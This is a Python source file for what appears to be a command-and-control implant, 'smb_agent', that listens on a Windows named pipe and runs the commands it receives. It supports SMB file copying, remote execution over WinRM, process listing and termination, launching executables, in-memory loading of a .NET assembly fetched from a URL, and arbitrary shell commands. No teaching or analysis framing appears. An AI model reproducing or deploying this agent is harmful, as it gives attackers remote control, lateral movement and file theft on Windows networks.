# smb_agent.py

import time
import logging
import subprocess
from multiprocessing import Process, Pipe

import win32pipe
import win32file
import pywintypes

# Importing common library functions
from utils.winapi.ls import ls
from utils.winapi.list_users_in_group import list_users_in_group
from utils.winapi.smb_get import smb_get
from utils.winapi.smb_write import smb_write
from utils.winapi.winrm_execute import winrm_execute
from utils.winapi.pwd import wpwd
from utils.winapi.wami import wami
from utils.winapi.ps import list_processes, grep_processes, terminate_process
from utils.winapi.run import run_process
from utils.winapi.netexec import load_dotnet_assembly
from utils.config import PIPENAME

#PIPE_NAME = r'\\.\pipe\smb_pipe'

logging.basicConfig(level=logging.INFO)

def handle_command(command):
    try:
        # Parsing and handling different commands using common library functions
        if command.startswith("ls"):
            path = command.split(' ', 1)[1]
            result = ls(path)
        elif command.startswith("users"):
            group_name = command.split(' ', 1)[1]
            result = list_users_in_group(group_name)
        elif command.startswith("smb get"):
            parts = command.split()
            remote_file_path, local_file_path = parts[2], parts[3]
            result = smb_get(remote_file_path, local_file_path)
        elif command.startswith("smb write"):
            parts = command.split()
            local_file_path, remote_smb_path = parts[2], parts[3]
            result = smb_write(local_file_path, remote_smb_path)
        elif command.startswith("winrmexec"):
            parts = command.split()
            remote_host, cmd = parts[1], parts[2]
            result = winrm_execute(remote_host, cmd)
        elif command.startswith("pwd"):
            result = wpwd()
        elif command == "whoami":
            result = wami()
        elif command.startswith("ps grep"):
            pattern = command.split(' ', 2)[2]
            result = grep_processes(pattern)
        elif command == "ps":
            result = list_processes()
        elif command.startswith("ps term"):
            process_id = int(command.split(' ', 2)[2])
            result = terminate_process(process_id)
        elif command.startswith("run"):
            executable_path = command.split(' ', 1)[1]
            result = run_process(executable_path)
        elif command.startswith("netexec"):
            parts = command.split(maxsplit=2)
            file_url, arguments = parts[1], parts[2]
            output, error = load_dotnet_assembly(file_url, arguments)
            result = output if not error else f"{output}\n{error}"
        else:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')

        # Ensure the result is a string
        if isinstance(result, list):
            result = "\n".join(result)
        return result
    except subprocess.CalledProcessError as e:
        return str(e)

def smb_agent(pipe_conn):
    while True:
        try:
            logging.info("Waiting for client to connect to the pipe...")
            handle = win32pipe.CreateNamedPipe(
                PIPENAME,
                win32pipe.PIPE_ACCESS_DUPLEX,
                win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_WAIT,
                1, 65536, 65536,
                0,
                None
            )

            win32pipe.ConnectNamedPipe(handle, None)
            logging.info("Client connected to the pipe.")

            while True:
                try:
                    resp = win32file.ReadFile(handle, 64*1024)
                    command = resp[1].decode('utf-8').strip()
                    logging.info(f"Received command: {command}")

                    if command.lower() == 'disconnect':
                        logging.info("Disconnect command received.")
                        win32file.CloseHandle(handle)
                        break  # Exit inner while loop to wait for new connection

                    result = handle_command(command)
                    win32file.WriteFile(handle, result.encode('utf-8'))
                except pywintypes.error as e:
                    logging.error(f"Pipe read/write error: {e}")
                    break
        except pywintypes.error as e:
            logging.error(f"Pipe creation error: {e}")

if __name__ == "__main__":
    parent_conn, child_conn = Pipe()
    p = Process(target=smb_agent, args=(child_conn,))
    p.start()
    while True:
        if parent_conn.poll():
            command = parent_conn.recv()
            if command == 'terminate':
                p.terminate()
                p.join()
                break
        time.sleep(1)
